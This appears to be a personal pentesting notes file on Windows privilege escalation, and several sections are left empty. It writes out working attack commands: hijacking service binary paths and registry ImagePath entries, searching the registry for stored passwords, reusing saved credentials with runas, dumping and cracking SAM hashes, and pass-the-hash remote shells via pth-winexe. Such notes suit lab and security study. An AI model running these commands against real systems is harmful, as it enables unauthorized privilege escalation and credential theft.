# Privilege Escalation

### For Windows Privilege Escalation Related Binaries and Instructions: [link me]()

### For Linux Privilege Escalation Related Binaries and Instructions: [link me]()

# Windows Methodology

For a more detailed windows privilege escalation methodology: [Windows-PrivEsc-Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

**Important windows privilege escalation related binaries:**
1. accesschk.exe 

  - downloadable link: `wget somewhere in misc/`
  - instructions: [link me](readme in misc/accesschk.exe)

### Services

***To query a service's configurations*** `sc qc <service-name>`

***To start or stop a service*** `net <start|stop> <service-name>`

1. Insecure service permissions
    - Description: if a user's permission is allowed to access and modify a service, such as SERVICE_CHANGE_CONFIG, we can change its binary path
    - Requirements: 
      - service must be running as LocalSystem 
      - SERVICE_CHANGE_CONFIG is within the permission of the user, or the group the user belongs to
      - ability to query the service configurations
      - ability to start and stop the service
    - Related instructions: 
      - accesschk parameters : `/accepteula -uvwqc` 
        - `c` is for service ACL check
      - sc command : `sc config <svc-name> binpath= "\"C:\path\to\service\binary\""` 
        - note the space between `=` and the binary path and the escaped quotes with `\`
      
2. Unquoted service paths
    - Description: if the binary to the service's path is not quoted and contain spaces, we can abuse Window's core functionality and create a binary in place that takes precedence. 
    - Requirements: 
       - service must be running as LocalSystem
       - ability to query service configurations
       - write access to **ANY** parent directories that happen after any spaces in the original binary path
       - ability to query the service configurations
       - ability to start and stop the service
    - Related instructions: 
       - accesschk parameters : `/accepteula -uvwqd` 
          - `d` is for directory ACL check
       
3.  Weak registry permissions
    - Description: if the service itself has a strong ACL, and we are unable to modify, if we have writable access to the service's registry entry, we can also change its binary path
    - Requirements: 
        - service must be running as LocalSystem 
        - write access to the service's registry entry under: `HKLM\SYSTEM\CurrentControlSet\services\servicename`
        - ability to query the service configurations
        - ability to start and stop the service
    - Related instructions: 
        - accesschk parameters : `/accepteula -uvwqk` 
          - `k` is for registry key ACL check
        - reg command : `reg add HKLM\SYSETM\CurrentControlSet\services\servicename /v ImagePath /t REG_EXPAND_SZ /d C:\Malicious\path /f`
          - `/v ImagePath`: specifies ImagePath registry entry
          - `/t REG_EXPAND_SZ` : specifies expanded string registry entry type
          - `/d C:\Malicious\path` : specifies the data we want to put inside the registry entry
          - `/f` : forces execution without user interaction/confirmation
          
4. Insecure service executable 
    - Description: If the service binary executable itself is writable by us, we can simply change that to point a malicious path
    - Requirements: 
        - service must be running as LocalSystem
        - write access to the service's executable
        - ability to query the service configurations
        - ability to start and stop the service
    - Related instructions: 
        - accesschk parameters : `/accepteula -uvwqh` 
          - `h` is for file or printer share ACL check
        - copy parameter : `/Y`
          - `/Y` for no confirmation (usually needed to replace any existing file)
          
        
### Registry
1. AutoRuns
    - Description: If any of the program's path in the autorun is writable, we can modify it. Once admin logs back on, the modified program should run as admin
    - Requirements: 
        - any of the autorun program's binary path needs to be writeble
        - must restart system
        - must have admin log on to trigger the autorun program's privlege as Administrator
    - Related instructions: 
        - accesschk parameters: `/accepteula -uvwqh`
          - `h` is for file ACL check
        - reg command: `req query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
          - `query` is for querying a registry key, note `add` was used to add registry value to a key
        - copy parameters: `/Y` for replacing existing file without user confirmation

2. AlwaysIntallElevated
    - Description : If the configuration for always installing software/applications as an elevated user is turned on for current user and local machine, we can install a malicious software as System
    - Requirements : 
        - **BOTH** HKLM and HKCU settings in AlwaysInstallElevated Key under SOFTWARE\Policies\Microsoft\Windows\Installer must be turned on `0x1`
    - Related instructions : 
        - reg commands: 
            - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
            - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` `/v` is the registry entry name under a specific key 

3. Passwords
    - Description: If the registry of winlogon in HKLM is readable, and if the Administrator had saved logon password in it, we pwn the admin account
    - Requirements: 
        - winlogon needs to have the admin user credentials
    - Related instructions: 
        - query all registry inside HKLM/HKCU hive for password: `reg query <HKCU|HKLM> /f password /t REG_SZ /s`
          - note that admin passwords should be stored inside `HKLM` unless current user is also admin
          - `/f` search pattern
          - `/t` type of registry value
          - `/s` query recursively
         - query specific autologon key: `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

### Password Management
1. Registry : Please see the last entry of the Privesc methodology of Registry [Registry-passwords](https://github.com/0x5929/Sec/edit/main/PrivEsc/README.md/README#L101)
2. Saved Creds
    - Description: Some users, for the purpose of convenience, will save credentials inside `cmdkey`, then we may run commands as another user using the saved credentials using `runas /savedcred ...`
    - Requirements: 
      - credentials must be saved inside `cmdkey`
    - Related instructions: 
      - cmdkey command to retreive creds : `cmdkey /list`
      - runas command to run as another user: `runas /savedcred /user:admin C:\command\running\as\admin`
        - this assumes that the admin user had saved creds inside a smartcard and verfied by the `cmdkey /list` command
3. SAM & SYSTEM files
    - Description: 
        - SAM and SYSTEM files stores user credential hashes and their encryption keys respectively
        - if we can extract those files (usually from backup locations, since normally those files are locked) we can crack user credential hashes
    - Requirements: 
        - backup of SAM and SYSTEM files must be available and readable to be copied to a remote host for hash cracking 
    - Related instructions: 
        - extract hashes: `git clone https://github.com/Neohapsis/creddump7.git && apt install python-crypto && creddump7/pwdump.py SYSTEM SAM`
          - note that python2 is deprated and `apt install python-crypto` could cause issues if not already installed on testing machine
          - please google for a viable solution if that happens
        - finding hash methods : `hashcat -h | grep -i ntlm`
          - note that there could several hashing methods relating to ntlm, we want to crack a system/os hash here
        - cracking hashes : `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
        - logging in with admin password (there are many ways to do this as well, ie runas, or via powershell credential obj): `winexe -U 'admin%pass' //MACHINE_IP cmd.exe`

4. PTH
    - Description: Once retrevied the hash from creddump7, we can just pass the hash to login instead of even cracking it
      - note that logging in with hash from a linux box can be done with : `pth-winexe`
      - logging in with the password from a linux box can be done with : `winexe` 
      - both will require SMB 445 to be open as winexe uses that for RCE and remote shell      
    - Requirements: 
      - SAM and SYSTEM files credential hashes to be dumped
    - Related instructions: 
      - logging with hash: `pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe`
        - note that the hash **must** be the full `LM:NTLM` hash


### Scheduled Tasks

### Applications and Programs

### Token Abuse

# Linux Methodology 


